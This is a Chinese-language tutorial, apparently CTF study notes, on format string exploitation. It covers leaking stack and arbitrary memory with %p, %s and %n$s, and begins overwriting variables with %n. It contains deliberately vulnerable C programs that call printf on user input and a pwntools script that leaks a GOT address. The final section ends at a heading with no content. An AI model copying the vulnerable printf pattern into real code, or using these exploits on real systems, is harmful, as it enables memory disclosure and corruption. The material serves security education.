# Format String Exploit

## 格式化字符串

>%d - 十进制 - 输出十进制整数   
%s - 字符串 - 从内存中读取字符串   
%x - 十六进制 - 输出十六进制数   
%c - 字符 - 输出字符   
%p - 指针 - 指针地址   
%n - 到目前为止所写的字符数   

主要有两个漏洞利用效果：   

## 1.泄露内存 
利用格式化字符串漏洞，我们还可以获取我们所想要输出的内容。一般会有如下几种操作

### 题目
`gcc -m32 -fno-stack-protector -no-pie -o leakmemory leakmemory.c` 
```c
#include <stdio.h>
int main() {
  char s[100];
  int a = 1, b = 0x22222222, c = -1;
  scanf("%s", s);
  printf("%08x.%08x.%08x.%s\n", a, b, c, s);
  printf(s);
  return 0;
}
```

### (1)泄露栈内存
- 获取某个变量的值
- 获取某个变量对应地址的内存

#### Exploit:
- 利用 `%x` 来获取对应栈的内存，但建议使用 `%p`，可以不用考虑位数的区别。
- 利用 `%s` 来获取变量所对应地址的内容，只不过有零截断。
- 利用 `%n$x` 来获取指定参数的值，以获取到对应的第 n+1 个参数的数值。   


### (2)泄露任意地址内存
- 利用 GOT 表得到 libc 函数地址，进而获取 libc，进而获取其它 libc 函数地址
- 盲打，dump 整个程序，获取有用信息。

#### 泄露AAAA(某函数地址）
格式：`<address>%<order>$s`   
改进格式：`<address>@@%<order>$s@@`  

由 0x41414141 处所在的位置可以看出我们的格式化字符串的起始地址正好是输出函数的第 5 个参数，但是是格式化字符串的第 4 个参数。 
```
$ ./leakmemory 
AAAA%p%p%p%p%p%p
00000001.22222222.ffffffff.AAAA%p%p%p%p%p%p
AAAA0xff95b7200xc20xf769479b0x414141410x702570250x70257025
```
可以看出，我们的程序崩溃了，为什么呢？这是因为我们试图将该格式化字符串所对应的值作为地址进行解析，但是显然该值没有办法作为一个合法的地址被解析，，所以程序就崩溃了。   
```
$ ./leakmemory 
%4$s
00000001.22222222.ffffffff.%4$s
Segmentation fault (core dumped)
```

EXP:
```python
from pwn import *
sh = process('./leakmemory')
leakmemory = ELF('./leakmemory')
__isoc99_scanf_got = leakmemory.got['__isoc99_scanf']
print hex(__isoc99_scanf_got)
payload = p32(__isoc99_scanf_got) + '%4$s'
print payload
gdb.attach(sh)
sh.sendline(payload)
sh.recvuntil('%4$s\n')
print hex(u32(sh.recv()[4:8])) # remove the first bytes of __isoc99_scanf@got
sh.interactive()
```

## 2.覆盖内存

>`%n`,不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。

### 题目
`gcc -m32 -fno-stack-protector -no-pie -o overwrite overwrite.c`    
修改变量a,b,c
```c
#include <stdio.h>
int a = 123, b = 456;
int main() {
  int c = 789;
  char s[100];
  printf("%p\n", &c);
  scanf("%s", s);
  printf(s);
  if (c == 16) {
    puts("modified c.");
  } else if (a == 2) {
    puts("modified a for a small number.");
  } else if (b == 0x12345678) {
    puts("modified b for a big number!");
  }
  return 0;
}
```
### PWN
Setp:   
- 确定覆盖地址   
确定需要泄露变量的地址
- 确定相对偏移   
确定一下存储格式化字符串的地址是 printf 将要输出的第几个参数 
- 进行覆盖

#### EXP1-覆盖变量c
